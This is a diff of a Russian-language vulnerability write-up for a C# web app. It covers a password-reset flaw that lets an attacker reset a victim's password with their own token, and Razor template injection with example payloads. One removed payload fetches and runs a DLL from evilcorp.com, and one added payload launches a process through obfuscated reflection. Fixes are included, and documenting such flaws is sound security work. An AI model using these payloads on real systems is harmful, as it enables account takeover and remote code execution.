@@ -152,27 +152,33 @@ await using var browser = await Puppeteer.LaunchAsync(new LaunchOptions
 
 Уязвимый код:
 ```C#
-    [HttpPost("password/request")]
-    public async Task<IActionResult> RequestReset([FromBody] PasswordResetRequest req)
+[HttpPost("password/reset")]
+    public IActionResult Reset([FromBody] ResetPasswordModel req)
     {
-        var user = _db.Users
-            .FromSqlRaw("SELECT * FROM Users WHERE Email = {0}", req.Email)
-            .AsNoTracking()
-            .FirstOrDefault();
+        var resetToken = _db.Users.FirstOrDefault(x => x.ResetToken == req.Token);
 
-        if (user == null)
-            return Ok(new { message = "Requested user does not exist!" });
+        if (resetToken == null)
+            return BadRequest("Invalid token");
 
-        user.ResetToken = Guid.NewGuid().ToString();
+        var account = _db.Users.FirstOrDefault(x => x.Email == req.Email);
 
-        await _db.Database.ExecuteSqlRawAsync(
-            "UPDATE Users SET ResetToken = {0} WHERE Email = {1}",
-            resetToken,
-            req.Email);
+        if (account == null)
+            return BadRequest("User not found");
 
-        _emailService.SendPasswordResetEmail(user.Email, user.ResetToken);
+        byte[] salt = RandomNumberGenerator.GetBytes(16);
+        using var pbkdf2 = new Rfc2898DeriveBytes(
+            req.NewPassword,
+            salt,
+            100000,
+            HashAlgorithmName.SHA256);
+        byte[] hash = pbkdf2.GetBytes(32);
+        account.PasswordHash = $"{Convert.ToBase64String(salt)}:{Convert.ToBase64String(hash)}";
 
-        return Ok(new { message = "Reset email has been sent." });
+        account.ResetToken = null;
+
+        _db.SaveChanges();
+
+        return Ok("Password updated");
     }
 ```
 1. Регистрируем аккаунт.
@@ -186,7 +192,7 @@ Content-Type: application/json
   "email": "attacker@email.com"
 }
 ```
-2. Отправляем POST запрос на endpoint `/api/user/password/reset` (заменяем параметр email на почту жертвы и токен берем с нашего email).
+3. Отправляем POST запрос на endpoint `/api/user/password/reset` (заменяем параметр email на почту жертвы и токен берем с нашего email).
 ```HTTP
 POST /api/user/password/reset HTTP/1.1
 Host: target.com
@@ -201,23 +207,10 @@ Content-Type: application/json
 
 
 **Рекомендации по устранению:**
-1. Проверять, принадледит ли токен для сброса пароля аккаунту пользователя:
+1. Проверять, принадлежит ли токен для сброса пароля аккаунту пользователя:
 ```C#
-[HttpPost("password/reset")]
-public async Task<IActionResult> ResetPassword([FromBody] PasswordResetConfirm req)
-{
-    var user = await _db.Users.FirstOrDefaultAsync(u => u.ResetToken == req.Token && u.Email == req.Email);
-
-    if (user == null || user.ResetTokenExpiry < DateTime.UtcNow)
-        return BadRequest(new { error = "Invalid or Outdated token." });
-
-    user.PasswordHash = HashPassword(req.NewPassword);
-    user.ResetToken = null;
-    user.ResetTokenExpiry = null;
-    await _db.SaveChangesAsync();
-
-    return Ok(new { message = "Password changed." });
-}
+        if (account.Email != resetToken.Email)
+            return BadRequest("Bad token!");
 ```
 ---
 
@@ -231,47 +224,23 @@ public async Task<IActionResult> ResetPassword([FromBody] PasswordResetConfirm r
 
 Уязвимый код:
 ```C#
-    [HttpPost("payslip")]
-    public async Task<IActionResult> SendPayslip([FromBody] EmailTemplateRequest req)
+private string Sanitize(string template)
     {
-        var configuredAdminApiKey = LoadAdminApiKey(AdminApiKeyPath);
+        if (string.IsNullOrEmpty(template))
+            return template;
 
-        if (string.IsNullOrWhiteSpace(req.AdminApiKey))
-            return Unauthorized(new { message = "AdminApiKey is required" });
+        string normalized = template.ToLower();
 
-        if (string.IsNullOrWhiteSpace(configuredAdminApiKey))
-            return StatusCode(500, new { message = "Admin API key is not configured" });
+        if (normalized.Contains("@{") || normalized.Contains("@()"))
+            throw new Exception("Code blocks are not allowed");
 
-        if (!string.Equals(req.AdminApiKey, configuredAdminApiKey, StringComparison.Ordinal))
-            return Unauthorized(new { message = "Invalid AdminApiKey" });
-
-        var user = _db.Users.FirstOrDefault(x => x.Email == req.Email);
-
-        if (user == null)
-            return NotFound("User not found");
-
-        var model = new PayslipModel
+        foreach (var word in blockedKeywords)
         {
-            Name = user.Email,
-            Salary = user.Salary,
-            Month = DateTime.UtcNow.ToString("MMMM", new CultureInfo("en-EN"))
-        };
-
-        string template =
-        @"Hello, @Model.Name!
-Your salary in @Model.Month is @Model.Salary!
-";
-
-        if (!string.IsNullOrWhiteSpace(req.Comment))
-        {
-            template += "\n" + req.Comment;
+            if (normalized.Contains(word))
+                throw new Exception(string.Format("Forbidden keyword detected: {0}", word));
         }
 
-        string body = await _templates.Render(template, model);
-
-        _emailService.SendEmail(user.Email, "Your payslip", body);
-
-        return Ok(new { message = "Payslip email sent" });
+        return template;
     }
 ```
 1. Отправить следующий POST запрос на endpoint `/api/email/payslip`:
@@ -289,31 +258,54 @@ Content-Length: ...
 пример payload:
 ```C#
 @if (true) {
-    var url = "http://evilcorp.com/payload.dll";
-    var wcTypeName = "S" + "ystem." + "Net." + "Web" + "Client";
-    var wcType = Type.GetType(wcTypeName);
-    var wcCtor = wcType.GetConstructor(Type.EmptyTypes);
-    var wc = wcCtor.Invoke(new object[0]);
-    var downloadMethod = wcType.GetMethod("DownloadData", new Type[] { "".GetType() });
-    var assemblyBytes = (byte[])downloadMethod.Invoke(wc, new object[] { url });
-    var assembly = AppDomain.CurrentDomain.Load(assemblyBytes);
-    var targetType = assembly.GetType("MyNamespace.MaliciousClass");
-    var entry = targetType.GetMethod("Execute", Type.EmptyTypes);
-    entry.Invoke(null, null);
+    var p1 = "Sys" + "tem." + "Diagn" + "ostics." + "Proc" + "ess";
+    var p2 = "".GetType();
+    var p3 = Type.GetType(p1);
+    var p4 = p3.GetMethod("Start", new[] { p2 });
+    p4.Invoke(null, new object[] { "calc.exe" });
 }
 ```
 
 **Рекомендации по устранению:**
-1. Не конкатенировать пользовательский ввод в шаблоны.
-2. Использовать безопасный язык шаблонов без возможности RCE (например Liquid в режиме только текст)
-3. Проводить валидацию и санитизацию входных данных
+1. Не использовать пользовательский ввод в шаблонах.
+2. Пример исправленного кода:
 ```C#
-string template = @"Hello, @Model.Name!
-Your salary in @Model.Month is @Model.Salary!";
-
-if (!string.IsNullOrWhiteSpace(req.Comment))
+[HttpPost("payslip")]
+public async Task<IActionResult> SendPayslip([FromBody] EmailTemplateRequest req)
 {
-    model.Comment = req.Comment;
-    template += "\n@Model.Comment"; 
+    var configuredAdminApiKey = LoadAdminApiKey(AdminApiKeyPath);
+
+    if (string.IsNullOrWhiteSpace(req.AdminApiKey))
+        return Unauthorized(new { message = "AdminApiKey is required" });
+
+    if (string.IsNullOrWhiteSpace(configuredAdminApiKey))
+        return StatusCode(500, new { message = "Admin API key is not configured" });
+
+    if (!string.Equals(req.AdminApiKey, configuredAdminApiKey, StringComparison.Ordinal))
+        return Unauthorized(new { message = "Invalid AdminApiKey" });
+
+    var user = _db.Users.FirstOrDefault(x => x.Email == req.Email);
+    if (user == null)
+        return NotFound("User not found");
+
+    var model = new PayslipModel
+    {
+        Name = user.Email,
+        Salary = user.Salary,
+        Month = DateTime.UtcNow.ToString("MMMM", new CultureInfo("en-EN")),
+        Comment = string.IsNullOrWhiteSpace(req.Comment) ? null : req.Comment   // <-- помещаем в модель
+    };
+
+    string template =
+@"Hello, @Model.Name!
+Your salary in @Model.Month is @Model.Salary!
+@if (Model.Comment != null) {
+    <text>Additional comment: @Model.Comment</text>
+}";
+
+    string body = await _templates.Render(template, model);
+
+    _emailService.SendEmail(user.Email, "Your payslip", body);
+    return Ok(new { message = "Payslip email sent" });
 }
 ```
